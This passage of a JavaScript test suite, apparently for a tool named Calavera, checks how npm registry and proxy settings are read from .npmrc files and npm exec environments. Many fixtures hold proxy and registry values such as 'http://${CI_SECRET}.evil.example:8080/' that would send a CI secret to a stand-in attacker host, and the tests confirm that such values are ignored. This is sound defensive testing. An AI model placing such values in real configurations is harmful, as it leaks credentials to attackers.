test("the ignored project proxy warning names HTTPS_PROXY when that variable carries the requests", async () => {
  const context = await fixture({
    project: "https-proxy=http://team.example.com:3128/\n",
    env: { npm_command: "exec", HTTPS_PROXY: "http://corp.example.com:8080/" },
  });
  context.env.npm_config_local_prefix = context.cwd;
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.match(warnings[0], /Calavera uses the HTTPS_PROXY environment variable instead\.$/);
});

test("npm_config_local_prefix alone marks a start by npm", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc: "https-proxy=http://attacker.example:8080/\n",
    member: "src",
    rootPackage: { name: "repo" },
    exported: { npm_config_https_proxy: "http://attacker.example:8080/" },
  });
  delete context.env.npm_command;
  assert.equal((await loadNpmRegistryOptions(context)).options.httpsProxy, undefined);
});

/** The project folder of the fixture the previous test created. */
let previousFixtureFolder = "";

test("a fixture folder exists during its test", async () => {
  const context = await fixture({ project: "registry=https://registry.example.com/\n" });
  previousFixtureFolder = context.cwd;
  await access(previousFixtureFolder);
});

test("the previous test's fixture folder is removed after that test", async () => {
  assert.notEqual(previousFixtureFolder, "");
  await assert.rejects(access(previousFixtureFolder), { code: "ENOENT" });
});

test("the ignored project proxy warning says requests go direct when noproxy or NO_PROXY excludes the registry", async () => {
  /** @type {Record<string, string>[]} */
  const exclusions = [{ NO_PROXY: "registry.npmjs.org" }, { npm_config_noproxy: "npmjs.org" }];
  for (const exclusion of exclusions) {
    const context = await fixture({
      user: "https-proxy=http://corp.example.com:8080/\n",
      project: "https-proxy=http://team.example.com:3128/\n",
      env: { HTTPS_PROXY: "http://env-proxy.example.com/", ...exclusion },
    });
    const { warnings } = await loadNpmRegistryOptions(context);
    assert.match(
      warnings[0],
      /The registry host is excluded from proxies, so requests go to it directly\.$/,
      JSON.stringify(exclusion),
    );
  }
});

test("for an http registry, the ignored project proxy warning names HTTP_PROXY", async () => {
  const context = await fixture({
    user: "registry=http://registry.example.com/\n",
    project: "proxy=http://team.example.com:3128/\n",
    env: { HTTP_PROXY: "http://corp.example.com:8080/" },
  });
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.ok(
    warnings.some((warning) =>
      warning.endsWith("Calavera uses the HTTP_PROXY environment variable instead."),
    ),
  );
});

test("pacoteTarballUrl moves a registry.npmjs.org tarball onto the given registry, as pacote does, and leaves other hosts", () => {
  const npmjs = "https://registry.npmjs.org/@schalkneethling/a/-/a-1.0.0.tgz";
  // The artifact scope's registry; pacote keeps the tarball path and drops the registry's path.
  assert.equal(
    pacoteTarballUrl(npmjs, "https://mirror.example.com/npm/"),
    "https://mirror.example.com/@schalkneethling/a/-/a-1.0.0.tgz",
  );
  // The default registry, when no scope registry applies.
  assert.equal(pacoteTarballUrl(npmjs, "https://registry.npmjs.org/"), npmjs);
  const other = "https://cdn.example.com/a-1.0.0.tgz";
  assert.equal(pacoteTarballUrl(other, "https://mirror.example.com/"), other);
  assert.equal(pacoteTarballUrl("not a url", "https://mirror.example.com/"), "not a url");
});

test("registryUrl is the artifact scope's registry, then the default registry, then npm's default", async () => {
  const scoped = await fixture({
    user: "registry=https://default.example.com/\n",
    project: `${SCOPE}:registry=https://scoped.example.com/npm/\n`,
  });
  assert.equal(
    (await loadNpmRegistryOptions(scoped)).registryUrl,
    "https://scoped.example.com/npm/",
  );
  const fallback = await fixture({ user: "registry=https://default.example.com/\n" });
  assert.equal(
    (await loadNpmRegistryOptions(fallback)).registryUrl,
    "https://default.example.com/",
  );
  assert.equal(
    (await loadNpmRegistryOptions(await fixture({}))).registryUrl,
    "https://registry.npmjs.org/",
  );
});

// #1186: `${VAR}` expands only in the user's own ~/.npmrc, in the account home folder. A project
// .npmrc `userconfig=./evil.npmrc` reaches Calavera as npm_config_userconfig, so a proxy written as
// `http://${CI_SECRET}.evil.example/` in that file would otherwise send the secret to the
// repository's host.
const SECRET_PROXY = "CISECRET0123456789";

test("a proxy with a variable in a user .npmrc outside the account home is ignored, and the warning names the key only", async () => {
  const context = await fixture({ env: { CI_SECRET: SECRET_PROXY } });
  const chosen = join(context.cwd, "evil.npmrc");
  await writeFile(chosen, "https-proxy=http://${CI_SECRET}.evil.example:8080/\n");
  const result = await loadNpmRegistryOptions({
    ...context,
    env: { ...context.env, npm_config_userconfig: chosen },
  });
  assert.equal(result.options.httpsProxy, undefined);
  assert.deepEqual(result.warnings, [
    "Ignored https-proxy in the user .npmrc: Calavera expands variables only in your own .npmrc in your account's home folder and in environment variables, never in a file that a variable or a project file names. Write the proxy URL without a variable, or remove the entry and set the proxy in your own .npmrc or an environment variable; while the entry is there, an npm_config_https_proxy variable does not replace it when npm starts Calavera.",
  ]);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
});

test("a literal proxy in a user .npmrc outside the account home still applies, because only expansion is restricted", async () => {
  const context = await fixture({});
  const chosen = join(context.cwd, "other.npmrc");
  await writeFile(chosen, "https-proxy=http://proxy.example.com:8080/\n");
  const { options, warnings } = await loadNpmRegistryOptions({
    ...context,
    env: { npm_config_userconfig: chosen },
  });
  assert.equal(options.httpsProxy, "http://proxy.example.com:8080/");
  assert.deepEqual(warnings, []);
});

test("under npm exec, the expanded copy npm exports from a chosen user .npmrc proxy is not used", async () => {
  const context = await fixture({
    project: "userconfig=./evil.npmrc\n",
    env: { CI_SECRET: SECRET_PROXY },
  });
  const chosen = join(context.cwd, "evil.npmrc");
  await writeFile(chosen, "https-proxy=http://${CI_SECRET}.evil.example:8080/\n");
  // The shape npm 11 exports for this project (probed with npm exec): the chosen file and the
  // proxy it expanded.
  const result = await loadNpmRegistryOptions({
    ...context,
    env: {
      CI_SECRET: SECRET_PROXY,
      npm_command: "exec",
      npm_config_local_prefix: context.cwd,
      npm_config_userconfig: chosen,
      npm_config_https_proxy: `http://${SECRET_PROXY}.evil.example:8080/`,
    },
  });
  assert.equal(result.options.httpsProxy, undefined);
  assert.match(
    result.warnings.join("\n"),
    /^Ignored https-proxy in the user \.npmrc that the project \.npmrc chose: Calavera expands variables only in user configuration files/m,
  );
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
});

test("the environment a real npm exec creates for a project userconfig does not carry the expanded proxy into the options", async (t) => {
  const context = await fixture({ project: "userconfig=./evil.npmrc\n" });
  await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
  await writeFile(
    join(context.cwd, "evil.npmrc"),
    "https-proxy=http://${CI_SECRET}.evil.example:8080/\n",
  );
  const home = join(context.directory, "home");
  await mkdir(home);
  const captured = await npmExecEnvironmentIn(t, context.cwd, home, { CI_SECRET: SECRET_PROXY });
  if (!captured) return;
  // npm resolves the temporary folder's symbolic links, such as /var to /private/var on macOS.
  assert.match(captured.npm_config_userconfig, /[\\/]project[\\/]evil\.npmrc$/);
  assert.equal(captured.npm_config_https_proxy, `http://${SECRET_PROXY}.evil.example:8080/`);
  const result = await loadNpmRegistryOptions({ ...context, env: captured });
  assert.equal(result.options.httpsProxy, undefined);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
});

test("the account home folder comes from os.userInfo(), not HOME", async () => {
  const directory = await temporaryDirectory("calavera-npm-config-account-home-");
  const home = join(directory, "home");
  const account = join(directory, "account");
  const project = join(directory, "project");
  for (const folder of [home, account, project]) await mkdir(folder);
  const npmrc = "https-proxy=http://${PROXY_HOST}:8080/\n";
  await writeFile(join(home, ".npmrc"), npmrc);
  await writeFile(join(account, ".npmrc"), npmrc);
  // A child process with a stubbed os.userInfo, so the real account's ~/.npmrc is never read. It
  // reports booleans only, never a value.
  const script = join(directory, "probe.mjs");
  const loader = new URL("../src/npm-config.js", import.meta.url).href;
  await writeFile(
    script,
    `import os from "node:os";
import { syncBuiltinESMExports } from "node:module";
let stubbed = false;
os.userInfo = () => {
  stubbed = true;
  // userInfo throws for an account without a password database entry.
  if (!process.env.STUB_ACCOUNT_HOME) throw new Error("no account");
  return { homedir: process.env.STUB_ACCOUNT_HOME, username: "probe", uid: -1, gid: -1, shell: null };
};
syncBuiltinESMExports();
const { loadNpmRegistryOptions } = await import(${JSON.stringify(loader)});
const { options } = await loadNpmRegistryOptions({
  cwd: process.env.PROBE_CWD,
  env: { HOME: process.env.PROBE_HOME, PROXY_HOST: "proxy.example.com" },
});
console.log(JSON.stringify({ stubbed, expanded: options.httpsProxy === "http://proxy.example.com:8080/" }));
`,
  );
  const run = async (/** @type {string} */ accountHome) =>
    JSON.parse(
      (
        await promisify(execFile)(process.execPath, [script], {
          env: {
            PATH: process.env.PATH,
            STUB_ACCOUNT_HOME: accountHome,
            PROBE_HOME: home,
            PROBE_CWD: project,
            // Under Stryker, the child runs the same mutant as this test.
            ...(process.env.__STRYKER_ACTIVE_MUTANT__
              ? { __STRYKER_ACTIVE_MUTANT__: process.env.__STRYKER_ACTIVE_MUTANT__ }
              : {}),
          },
        })
      ).stdout,
    );
  // HOME names a folder that is not the account's, as a Yarn 4 .env.yarn can make it.
  assert.deepEqual(await run(account), { stubbed: true, expanded: false });
  assert.deepEqual(await run(home), { stubbed: true, expanded: true });
  // Without an account home, no user file expands variables, and the loader still works.
  assert.deepEqual(await run(""), { stubbed: true, expanded: false });
});

/**
 * A fixture's loader context with the variables npm exec exports for it.
 * @param {Awaited<ReturnType<typeof fixture>>} context
 * @param {Record<string, string>} exported
 */
function npmExecContext(context, exported) {
  return {
    ...context,
    env: {
      ...context.env,
      CI_SECRET: SECRET_PROXY,
      npm_command: "exec",
      npm_config_local_prefix: context.cwd,
      ...exported,
    },
  };
}

test("under npm exec, a proxy that a chosen user .npmrc spells differently is not trusted as environment", async () => {
  const context = await fixture({ project: "userconfig=./evil.npmrc\n" });
  const chosen = join(context.cwd, "evil.npmrc");
  for (const spelling of ["https_proxy", "HTTPS-PROXY"]) {
    await writeFile(chosen, `${spelling}=http://\${CI_SECRET}.evil.example:8080/\n`);
    // npm warns about the unknown key, but still exports it as npm_config_https_proxy.
    const result = await loadNpmRegistryOptions(
      npmExecContext(context, {
        npm_config_userconfig: chosen,
        npm_config_https_proxy: `http://${SECRET_PROXY}.evil.example:8080/`,
      }),
    );
    assert.equal(result.options.httpsProxy, undefined, spelling);
    // The project chose the file, so its proxy, under any spelling, is ignored with a warning.
    assert.match(
      result.warnings.join("\n"),
      /in the user \.npmrc that the project \.npmrc chose: Calavera (reads proxies only|expands variables only)/,
      spelling,
    );
    assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
  }
});

test("under npm exec, a project proxy key with a variable in it is project content, because npm expands keys", async () => {
  const context = await fixture({
    project: "https-proxy${NOPE?}=http://${CI_SECRET}.evil.example:8080/\n",
  });
  const result = await loadNpmRegistryOptions(
    npmExecContext(context, {
      npm_config_https_proxy: `http://${SECRET_PROXY}.evil.example:8080/`,
    }),
  );
  assert.equal(result.options.httpsProxy, undefined);
  assert.match(
    result.warnings.join("\n"),
    /^Ignored https-proxy\$\{NOPE\?\} in the project \.npmrc/m,
  );
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
});

test("under npm exec, a project registry key with a variable in it follows the project registry rules", async () => {
  const withVariable = await fixture({
    project: "registry${NOPE?}=https://evil.example/${CI_SECRET}/\n",
  });
  await assert.rejects(
    loadNpmRegistryOptions(
      npmExecContext(withVariable, {
        npm_config_registry: `https://evil.example/${SECRET_PROXY}/`,
      }),
    ),
    (error) => {
      assert.match(error.message, /in the project \.npmrc contains a variable reference/);
      assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(`${SECRET_PROXY}|evil`));
      return true;
    },
  );
  const http = await fixture({ project: "registry${NOPE?}=http://insecure.example.com/\n" });
  await assert.rejects(
    loadNpmRegistryOptions(
      npmExecContext(http, { npm_config_registry: "http://insecure.example.com/" }),
    ),
    /in the project \.npmrc must be an https URL/,
  );
  const literal = await fixture({ project: "registry${NOPE?}=https://mirror.example.com/\n" });
  const { options, registry } = await loadNpmRegistryOptions(
    npmExecContext(literal, { npm_config_registry: "https://mirror.example.com/" }),
  );
  assert.equal(options.registry, "https://mirror.example.com/");
  assert.equal(registry.source, "project .npmrc");
  // A key that npm does not use, such as REGISTRY, is not applied, as before.
  const unused = await fixture({ project: "REGISTRY=https://mirror.example.com/\n" });
  const dropped = await loadNpmRegistryOptions(
    npmExecContext(unused, { npm_config_registry: "https://mirror.example.com/" }),
  );
  assert.equal(dropped.options.registry, undefined);
  assert.deepEqual(dropped.warnings, []);
});

test("under npm exec, a value in both the project and the user .npmrc follows the project rules", async () => {
  const context = await fixture({
    project: "registry${NOPE?}=http://shared.example.com/\n",
    user: "registry=http://shared.example.com/\n",
  });
  await assert.rejects(
    loadNpmRegistryOptions(
      npmExecContext(context, { npm_config_registry: "http://shared.example.com/" }),
    ),
    /in the project \.npmrc must be an https URL/,
  );
});

test("a real npm exec exports a project proxy key with a variable in it, and Calavera does not trust the copy", async (t) => {
  const context = await fixture({
    project: "https-proxy${NOPE?}=http://${CI_SECRET}.evil.example:8080/\n",
  });
  await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
  const home = join(context.directory, "home");
  await mkdir(home);
  const captured = await npmExecEnvironmentIn(t, context.cwd, home, { CI_SECRET: SECRET_PROXY });
  if (!captured) return;
  assert.equal(captured.npm_config_https_proxy, `http://${SECRET_PROXY}.evil.example:8080/`);
  const result = await loadNpmRegistryOptions({ ...context, env: captured });
  assert.equal(result.options.httpsProxy, undefined);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
});

test("under npm exec, a caller's https-proxy equal to a project proxy under another key is still the caller's", async () => {
  const context = await fixture({ project: "proxy=http://shared-proxy.example.com:8080/\n" });
  const { options } = await loadNpmRegistryOptions(
    npmExecContext(context, {
      npm_config_proxy: "http://shared-proxy.example.com:8080/",
      npm_config_https_proxy: "http://shared-proxy.example.com:8080/",
    }),
  );
  assert.equal(options.httpsProxy, "http://shared-proxy.example.com:8080/");
  assert.equal(options.proxy, undefined);
});

// npm reads a global config file too: the file `globalconfig` names, or `<prefix>/etc/npmrc`
// (`loadGlobalConfig` and the `globalconfig` default in @npmcli/config lib/index.js). A project
// .npmrc can choose it with `globalconfig=./g.npmrc`, or with `prefix=./pfx`, which npm reports as
// an error but still applies. npm expands variables in that file and exports its values (#1186).
const GLOBAL_PROXY = "https-proxy=http://${CI_SECRET}.proxy.invalid:1/\n";

test("a real npm exec with a project globalconfig does not carry the global file's expanded proxy into the options", async (t) => {
  const context = await fixture({ project: "globalconfig=./g.npmrc\n" });
  await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
  await writeFile(join(context.cwd, "g.npmrc"), GLOBAL_PROXY);
  const home = join(context.directory, "home");
  await mkdir(home);
  const captured = await npmExecEnvironmentIn(t, context.cwd, home, { CI_SECRET: SECRET_PROXY });
  if (!captured) return;
  assert.equal(captured.npm_config_https_proxy, `http://${SECRET_PROXY}.proxy.invalid:1/`);
  const result = await loadNpmRegistryOptions({ ...context, env: captured });
  assert.equal(result.options.httpsProxy, undefined);
  assert.match(result.warnings.join("\n"), /^Ignored https-proxy in the global npmrc/m);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
});

test("a real npm exec with a project globalconfig stops on a registry with a variable in the global file", async (t) => {
  const context = await fixture({ project: "globalconfig=./g.npmrc\n" });
  await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
  await writeFile(
    join(context.cwd, "g.npmrc"),
    "registry=https://reg.example.invalid/${CI_SECRET}/\n",
  );
  const home = join(context.directory, "home");
  await mkdir(home);
  const captured = await npmExecEnvironmentIn(t, context.cwd, home, { CI_SECRET: SECRET_PROXY });
  if (!captured) return;
  assert.equal(captured.npm_config_registry, `https://reg.example.invalid/${SECRET_PROXY}/`);
  await assert.rejects(loadNpmRegistryOptions({ ...context, env: captured }), (error) => {
    assert.match(error.message, /registry in the global npmrc contains a variable reference/);
    assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(`${SECRET_PROXY}|invalid`));
    return true;
  });
});

test("a real npm exec with a project prefix does not carry <prefix>/etc/npmrc's expanded proxy into the options", async (t) => {
  const context = await fixture({ project: "prefix=./pfx\n" });
  await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
  await mkdir(join(context.cwd, "pfx", "etc"), { recursive: true });
  await writeFile(join(context.cwd, "pfx", "etc", "npmrc"), GLOBAL_PROXY);
  const home = join(context.directory, "home");
  await mkdir(home);
  const captured = await npmExecEnvironmentIn(t, context.cwd, home, { CI_SECRET: SECRET_PROXY });
  if (!captured) return;
  assert.equal(captured.npm_config_https_proxy, `http://${SECRET_PROXY}.proxy.invalid:1/`);
  const result = await loadNpmRegistryOptions({ ...context, env: captured });
  assert.equal(result.options.httpsProxy, undefined);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
});

/**
 * A fixture whose npm exec environment names a global config file at `globalPath`, relative to
 * the fixture directory, with `content`, and exports `exported`.
 * @param {{ project?: string, globalPath: string, content: string, exported: Record<string, string>, globalconfigVariable?: boolean }} setup
 */
async function globalConfigContext({
  project,
  globalPath,
  content,
  exported,
  globalconfigVariable = true,
}) {
  const context = await fixture({ project });
  const path = join(context.directory, globalPath);
  await mkdir(join(path, ".."), { recursive: true });
  await writeFile(path, content);
  return npmExecContext(context, {
    npm_config_global_prefix: join(context.directory, "node"),
    ...(globalconfigVariable ? { npm_config_globalconfig: path } : {}),
    ...exported,
  });
}

test("under npm exec, the default global npmrc outside the project keeps user trust, without expansion", async () => {
  const literal = await globalConfigContext({
    globalPath: "node/etc/npmrc",
    content: "registry=http://mirror.example.com/\nhttps-proxy=http://admin-proxy.example.com:1/\n",
    exported: {
      npm_config_registry: "http://mirror.example.com/",
      npm_config_https_proxy: "http://admin-proxy.example.com:1/",
    },
  });
  const { options, registry, warnings } = await loadNpmRegistryOptions(literal);
  assert.equal(options.registry, "http://mirror.example.com/");
  assert.equal(options.httpsProxy, "http://admin-proxy.example.com:1/");
  assert.equal(registry.source, "global npmrc");
  assert.deepEqual(warnings, []);

  const withVariable = await globalConfigContext({
    globalPath: "node/etc/npmrc",
    content: GLOBAL_PROXY,
    exported: { npm_config_https_proxy: `http://${SECRET_PROXY}.proxy.invalid:1/` },
  });
  const result = await loadNpmRegistryOptions(withVariable);
  assert.equal(result.options.httpsProxy, undefined);
  assert.match(
    result.warnings.join("\n"),
    /^Ignored https-proxy in the global npmrc: Calavera expands variables only in your own \.npmrc/m,
  );
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
});

test("under npm exec without npm_config_globalconfig, the global npmrc is <global prefix>/etc/npmrc", async () => {
  const context = await globalConfigContext({
    globalPath: "node/etc/npmrc",
    content: "registry=https://mirror.example.com/\n",
    exported: { npm_config_registry: "https://mirror.example.com/" },
    globalconfigVariable: false,
  });
  assert.equal((await loadNpmRegistryOptions(context)).registry.source, "global npmrc");
});

test("under npm exec, a global npmrc that a project file chooses or that lies in the project follows the project rules", async () => {
  /** @type {[string | undefined, string][]} */
  const cases = [
    ["globalconfig=../elsewhere/g.npmrc\n", "elsewhere/g.npmrc"],
    ["prefix=../elsewhere\n", "elsewhere/etc/npmrc"],
    // The caller's npm_config_globalconfig names a file inside the project.
    [undefined, "project/g.npmrc"],
  ];
  for (const [project, globalPath] of cases) {
    const context = await globalConfigContext({
      project,
      globalPath,
      content: "registry=http://insecure.example.com/\n",
      exported: { npm_config_registry: "http://insecure.example.com/" },
    });
    await assert.rejects(
      loadNpmRegistryOptions(context),
      /registry in the global npmrc must be an https URL/,
      globalPath,
    );
  }
});

test("without a start by npm, no global npmrc is read", async () => {
  const context = await fixture({});
  const path = join(context.directory, "g.npmrc");
  await writeFile(path, "registry=https://mirror.example.com/\n");
  const { registry } = await loadNpmRegistryOptions({
    ...context,
    env: { ...context.env, npm_config_globalconfig: path },
  });
  assert.equal(registry.source, "default");
});

test("under npm exec, a global npmrc that is the user or the project .npmrc is not read twice", async () => {
  const user = await fixture({
    user: "https-proxy=http://${PROXY_HOST}:8080/\n",
    env: { PROXY_HOST: "proxy.example.com" },
  });
  const asUser = await loadNpmRegistryOptions(
    npmExecContext(user, {
      PROXY_HOST: "proxy.example.com",
      npm_config_globalconfig: user.env.npm_config_userconfig,
      npm_config_https_proxy: "http://proxy.example.com:8080/",
    }),
  );
  assert.equal(asUser.options.httpsProxy, "http://proxy.example.com:8080/");
  assert.deepEqual(asUser.warnings, []);

  const project = await fixture({ project: "https-proxy=http://attacker.example:8080/\n" });
  const asProject = await loadNpmRegistryOptions(
    npmExecContext(project, {
      npm_config_globalconfig: join(project.cwd, ".npmrc"),
      npm_config_https_proxy: "http://attacker.example:8080/",
    }),
  );
  assert.equal(asProject.warnings.length, 1);
});

test("under npm exec, a global npmrc that a chosen user .npmrc names, among other keys, follows the project rules", async () => {
  // The project .npmrc chooses the user file, so the user file is repository content too.
  const context = await fixture({ project: "userconfig=./evil.npmrc\n" });
  const chosen = join(context.cwd, "evil.npmrc");
  await writeFile(
    chosen,
    "registry=https://user.example.com/\nglobalconfig=../elsewhere/g.npmrc\n",
  );
  const global = join(context.directory, "elsewhere", "g.npmrc");
  await mkdir(join(global, ".."), { recursive: true });
  await writeFile(global, "@schalkneethling:registry=http://insecure.example.com/\n");
  await assert.rejects(
    loadNpmRegistryOptions(
      npmExecContext(context, {
        npm_config_userconfig: chosen,
        npm_config_globalconfig: global,
        npm_config_registry: "https://user.example.com/",
        [`npm_config_${SCOPE}:registry`]: "http://insecure.example.com/",
      }),
    ),
    /registry in the global npmrc must be an https URL/,
  );
  // A project .npmrc with other keys besides globalconfig chooses the file just the same.
  const project = await globalConfigContext({
    project: "registry=https://project.example.com/\nglobalconfig=../elsewhere/g.npmrc\n",
    globalPath: "elsewhere/g.npmrc",
    content: `${SCOPE}:registry=http://insecure.example.com/\n`,
    exported: { [`npm_config_${SCOPE}:registry`]: "http://insecure.example.com/" },
  });
  await assert.rejects(
    loadNpmRegistryOptions(project),
    /registry in the global npmrc must be an https URL/,
  );
});

test("a list or a boolean under a proxy key is not a proxy, and does not stop the loader", async () => {
  const context = await fixture({
    user: "https-proxy[]=http://list-proxy.example.com/\nproxy=true\nnoproxy[]=a.example.com\nnoproxy[]=b.example.com\n",
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { noProxy: "a.example.com,b.example.com" });
});

// #1186, third review: npm expands a project value with the environment it had when it loaded
// the file, and exports a list as its entries joined with blank lines (`envVal` in
// @npmcli/config set-envs.js) without expanding them. Calavera cannot always reproduce either, so
// an exported value that a file may hold is that file's content.

test("a real npm exec with a project https-proxy list does not carry the list's proxy into the options", async (t) => {
  for (const value of ["http://${CI_SECRET}.evil.invalid:1/", "http://evil.invalid:1/"]) {
    const context = await fixture({ project: `https-proxy[]=${value}\n` });
    await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
    const home = join(context.directory, "home");
    await mkdir(home);
    const captured = await npmExecEnvironmentIn(t, context.cwd, home, { CI_SECRET: SECRET_PROXY });
    if (!captured) return;
    // npm exports the list without expanding it.
    assert.equal(captured.npm_config_https_proxy, value);
    const result = await loadNpmRegistryOptions({ ...context, env: captured });
    assert.equal(result.options.httpsProxy, undefined, value);
    assert.match(result.warnings.join("\n"), /^Ignored https-proxy in the project \.npmrc/m);
    assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
  }
});

test("a real npm exec with a project proxy whose expansion changes after npm loads it does not carry the proxy into the options", async (t) => {
  for (const suffix of ["${npm_config_https_proxy?}", "${INIT_CWD?}"]) {
    const context = await fixture({
      project: `https-proxy=http://\${CI_SECRET}.evil.invalid:1/${suffix}\n`,
    });
    await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
    const home = join(context.directory, "home");
    await mkdir(home);
    const captured = await npmExecEnvironmentIn(t, context.cwd, home, { CI_SECRET: SECRET_PROXY });
    if (!captured) return;
    const result = await loadNpmRegistryOptions({
      ...context,
      env: { ...captured, INIT_CWD: context.cwd },
    });
    assert.equal(result.options.httpsProxy, undefined, suffix);
    assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
  }
});

test("a real npm exec with a project globalconfig outside the project does not carry its expanded proxy into the options", async (t) => {
  const context = await fixture({ project: "globalconfig=../elsewhere/g.npmrc\n" });
  await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
  await mkdir(join(context.directory, "elsewhere"));
  await writeFile(join(context.directory, "elsewhere", "g.npmrc"), GLOBAL_PROXY);
  const home = join(context.directory, "home");
  await mkdir(home);
  const captured = await npmExecEnvironmentIn(t, context.cwd, home, { CI_SECRET: SECRET_PROXY });
  if (!captured) return;
  assert.equal(captured.npm_config_https_proxy, `http://${SECRET_PROXY}.proxy.invalid:1/`);
  const result = await loadNpmRegistryOptions({ ...context, env: captured });
  assert.equal(result.options.httpsProxy, undefined);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
});

test("under npm exec, a caller's own npm_config_https_proxy with a variable is expanded, because npm passes it on unchanged", async () => {
  const context = await fixture({});
  const result = await loadNpmRegistryOptions(
    npmExecContext(context, {
      CORP_HOST: "corp.example.com",
      npm_config_https_proxy: "http://${CORP_HOST}:3128/",
    }),
  );
  assert.equal(result.options.httpsProxy, "http://corp.example.com:3128/");
  assert.deepEqual(result.warnings, []);
});

test("under npm exec, a global npmrc proxy whose expansion changes after npm loads it is not trusted as environment", async () => {
  const context = await globalConfigContext({
    project: "globalconfig=./g.npmrc\n",
    globalPath: "project/g.npmrc",
    content: "https-proxy=http://evil.invalid:1/${npm_config_https_proxy?}\n",
    exported: { npm_config_https_proxy: "http://evil.invalid:1/" },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
});

test("the installation's global npmrc warning about a variable names that file, and says how to keep the proxy", async () => {
  const context = await globalConfigContext({
    globalPath: "node/etc/npmrc",
    content: GLOBAL_PROXY,
    exported: { npm_config_https_proxy: `http://${SECRET_PROXY}.proxy.invalid:1/` },
  });
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.deepEqual(warnings, [
    "Ignored https-proxy in the global npmrc: Calavera expands variables only in your own .npmrc in your account's home folder and in environment variables, not in npm's global configuration file. Write the proxy URL without a variable, or remove the entry and set the proxy in your own .npmrc or an environment variable; while the entry is there, an npm_config_https_proxy variable does not replace it when npm starts Calavera.",
  ]);
});

test("under npm exec, a global npmrc reached through a symbolic link to the project, or in a folder whose name starts with .., follows the project rules", async () => {
  const context = await fixture({});
  const alias = join(context.directory, "alias");
  await symlink(context.cwd, alias, "dir");
  await mkdir(join(context.cwd, "..cache"));
  for (const path of [join(alias, "g.npmrc"), join(context.cwd, "..cache", "g.npmrc")]) {
    await writeFile(path, "registry=http://insecure.example.com/\n");
    await assert.rejects(
      loadNpmRegistryOptions(
        npmExecContext(context, {
          npm_config_globalconfig: path,
          npm_config_registry: "http://insecure.example.com/",
        }),
      ),
      /registry in the global npmrc must be an https URL/,
      path,
    );
  }
});

test("under npm exec, a chooser key with a variable in it, which npm expands, chooses the global npmrc", async () => {
  const context = await globalConfigContext({
    project: "globalconfig${NOPE?}=../elsewhere/g.npmrc\n",
    globalPath: "elsewhere/g.npmrc",
    content: "registry=http://insecure.example.com/\n",
    exported: { npm_config_registry: "http://insecure.example.com/" },
  });
  await assert.rejects(
    loadNpmRegistryOptions(context),
    /registry in the global npmrc must be an https URL/,
  );
});

test("under npm exec, a prefix in your own ~/.npmrc or in a user .npmrc the caller chose keeps the global npmrc trusted", async () => {
  // The account's own ~/.npmrc, as in a ~/.npm-global setup.
  const own = await globalConfigContext({
    globalPath: "npm-global/etc/npmrc",
    content: "registry=http://mirror.example.com/\n",
    exported: { npm_config_registry: "http://mirror.example.com/" },
  });
  await writeFile(own.env.npm_config_userconfig, "prefix=../npm-global\n");
  assert.equal((await loadNpmRegistryOptions(own)).registry.source, "global npmrc");

  // A user .npmrc that npm_config_userconfig names, as in CI, which no project file chose.
  const ci = await globalConfigContext({
    globalPath: "npm-global/etc/npmrc",
    content: "registry=http://mirror.example.com/\n",
    exported: { npm_config_registry: "http://mirror.example.com/" },
  });
  const ciUserconfig = join(ci.cwd, "..", "ci.npmrc");
  await writeFile(ciUserconfig, "prefix=./npm-global\n");
  ci.env.npm_config_userconfig = ciUserconfig;
  assert.equal((await loadNpmRegistryOptions(ci)).registry.source, "global npmrc");
});

test("under npm exec, a project proxy list that npm exported is the project's, and is ignored", async () => {
  const context = await fixture({ project: "https-proxy[]=http://evil.invalid:1/\n" });
  const { options, warnings } = await loadNpmRegistryOptions(
    npmExecContext(context, { npm_config_https_proxy: "http://evil.invalid:1/" }),
  );
  assert.equal(options.httpsProxy, undefined);
  assert.match(warnings.join("\n"), /^Ignored https-proxy in the project \.npmrc/m);
});

// #1186, fourth review: npm expands a key with the environment it had when it loaded the file, and
// variables such as INIT_CWD and the npm_config_* exports are set only afterwards. In a file that
// Calavera does not expand, each variable in a key may therefore stand for any text.

test("under npm exec, a project proxy key whose variable npm expanded differently is still the project's", async () => {
  for (const projectKey of [
    "https-proxy${INIT_CWD?}",
    "HTTPS_PROXY${INIT_CWD?}",
    "proxy${npm_command?}",
  ]) {
    const key = projectKey.startsWith("proxy") ? "npm_config_proxy" : "npm_config_https_proxy";
    const context = await fixture({
      project: `${projectKey}=http://\${CI_SECRET}.evil.example/\n`,
    });
    const result = await loadNpmRegistryOptions(
      npmExecContext(context, {
        INIT_CWD: context.cwd,
        [key]: `http://${SECRET_PROXY}.evil.example/`,
      }),
    );
